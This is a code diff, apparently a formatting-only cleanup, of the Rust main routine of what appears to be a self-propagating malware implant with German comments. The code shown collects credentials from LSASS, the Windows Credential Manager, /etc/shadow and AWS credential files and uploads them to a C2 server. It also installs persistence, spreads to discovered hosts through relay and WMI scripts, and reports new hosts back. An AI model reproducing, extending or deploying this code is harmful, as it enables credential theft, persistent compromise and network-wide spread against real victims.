@@ -52,8 +52,7 @@ struct Args {
 async fn main() {
     tracing_subscriber::fmt()
         .with_env_filter(
-            tracing_subscriber::EnvFilter::try_from_default_env()
-                .unwrap_or_else(|_| "info".into()),
+            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| "info".into()),
         )
         .init();
 
@@ -93,7 +92,10 @@ async fn main() {
             error!("Secret-Upload fehlgeschlagen: {e}");
         }
     }
-    info!("{} lokale Secrets extrahiert und hochgeladen", local_secrets.len());
+    info!(
+        "{} lokale Secrets extrahiert und hochgeladen",
+        local_secrets.len()
+    );
 
     // 2. Persistenz installieren.
     if let Err(e) = install_persistence(&args).await {
@@ -127,12 +129,8 @@ async fn main() {
         }
     };
 
-    let results = propagate::run_propagation(
-        &discovered,
-        &args.relay_script,
-        &args.wmi_script,
-    )
-    .await;
+    let results =
+        propagate::run_propagation(&discovered, &args.relay_script, &args.wmi_script).await;
 
     // 4. Neuentdeckte Hosts an den C2-Server melden.
     for h in &results.new_hosts {
@@ -167,7 +165,10 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 source: Some("lsass".into()),
             });
         }
-        for secret in kx_win::extract_credential_manager().await.unwrap_or_default() {
+        for secret in kx_win::extract_credential_manager()
+            .await
+            .unwrap_or_default()
+        {
             out.push(kx_core::c2::SecretUpload {
                 host_id: host_id.to_string(),
                 cred_type: "credential_manager".into(),
@@ -188,7 +189,10 @@ async fn collect_local_secrets(host_id: &str) -> Vec<kx_core::c2::SecretUpload> 
                 source: Some("/etc/shadow".into()),
             });
         }
-        for secret in kx_posix::extract_aws_credentials().await.unwrap_or_default() {
+        for secret in kx_posix::extract_aws_credentials()
+            .await
+            .unwrap_or_default()
+        {
             out.push(kx_core::c2::SecretUpload {
                 host_id: host_id.to_string(),
                 cred_type: "aws".into(),
